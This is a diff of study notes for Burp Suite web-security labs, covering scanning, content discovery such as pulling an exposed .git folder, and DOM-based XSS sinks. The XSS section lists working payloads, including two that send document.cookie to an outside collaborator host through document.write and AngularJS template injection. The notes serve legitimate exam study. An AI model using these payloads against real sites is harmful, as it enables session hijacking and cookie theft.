@@ -1,16 +1,40 @@
 0. Scanning
-  0.1. Active Scans of requests
-  0.2. Scanning custom insertion point
+  -Active Scans of requests
+  -Scanning custom insertion point
+  -Find comments
+  -Find scripts
 
 1. Content Discovery
-  1.1. Find comments
-  1.2. Find scripts
-  1.3. Discover content
+  -Discover content
     https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/wordlists/burp-labs-wordlist.txt
-  1.4. Try to make error - watch for messages
-  1.5. Debug pages(/cgi-bin/phpinfo.php), backup files
-  1.6. Trace to unauthorized pages
-  1.7. Version Control
+  -Try to make error - watch for messages
+  -Debug pages(/cgi-bin/phpinfo.php), backup files
+  -Trace to unauthorized pages: TRACE /admin
+  -Version Control
       wget -r https://YOUR-LAB-ID.web-security-academy.net/.git/
       git log -p
+
+
+2. DOM-based vulns
+  Vuln sinks: document.write(), document.writeln(), document.domain, element.innerHTML, element.outerHTMLelement.insertAdjacentHTML
+element.onevent
+  jQuery sinks: add, after, append, animate, insertAfter/Before, beforme, wrap, $.parseHTML, init, constructor
+  -SINKS
+    document.write:
+        accepts scripts inside document.write('... <script>document.location='https://OASTIFY.COM/?domxss='+document.cookie</script> ...');
+    innerHTML:
+        svg or img with events: <img src=1 onerror=alert(document.domain)>
+    jQuery attr:
+        javascript:alert(document.cookie)
+    jQuery selector $() with location.hash:
+        <iframe src="https://lab/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+    Reflected DOM with eval:
+        \"-alert(1)}//
+    replace() function eliminating <>, add another tags
+        <><img src=1 onerror=alert(1)>
+  -DOM Invader
+  -Angular
+    sink inside ng-app tag use: 
+      {{$angular_scope_function.constructor('document.location="https://OASTIFY.COM?c="+document.cookie')()}}
+  -Web Messages XSS
   
